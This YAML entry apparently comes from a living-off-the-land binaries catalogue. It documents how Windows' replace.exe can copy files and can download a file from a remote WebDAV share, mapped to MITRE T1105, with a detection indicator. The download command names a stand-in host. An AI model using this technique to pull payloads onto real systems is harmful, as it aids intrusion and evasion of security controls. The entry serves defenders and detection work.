---
name: Replace.exe
description: Used to replace file with another file
functions:
  download:
    - description: Download/Copy bar.exe to outdir
      code: replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A
      mitreid: T1105
      mitrelink: https://attack.mitre.org/wiki/Technique/T1105
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Download file
  copy:
    - description: Copy file.cab to destination
      code: replace.exe C:\Source\File.cab C:\Destination /A
      mitreid: T1105
      mitrelink: https://attack.mitre.org/wiki/Technique/T1105
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Copy files
resources:
    - resource: https://twitter.com/elceef/status/986334113941655553
    - resource: https://twitter.com/elceef/status/986842299861782529
fullpath:
    - path: C:\Windows\System32\replace.exe
    - path: C:\Windows\SysWOW64\replace.exe
detection:
  - IOC: Replace.exe getting files from remote server
acknowledgement:
  - Person: elceef
    Handle: '@elceef'
---
